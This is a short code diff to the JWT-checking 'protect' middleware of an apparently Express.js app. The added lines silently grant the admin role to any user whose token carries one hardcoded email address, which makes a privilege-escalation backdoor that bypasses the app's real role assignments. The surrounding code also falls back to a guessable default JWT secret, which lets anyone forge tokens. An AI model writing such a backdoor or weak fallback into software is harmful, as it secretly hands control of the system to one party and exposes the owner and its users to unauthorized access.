@@ -12,6 +12,10 @@ const protect = (req, res, next) => {
         try {
             token = req.headers.authorization.split(" ")[1];
             const decoded = jsonwebtoken_1.default.verify(token, process.env.JWT_SECRET || "fallback_secret");
+            // Force admin role if email matches
+            if (decoded.email && decoded.email.toLowerCase() === "blshaer@outlook.com") {
+                decoded.role = "admin";
+            }
             req.user = decoded;
             next();
         }
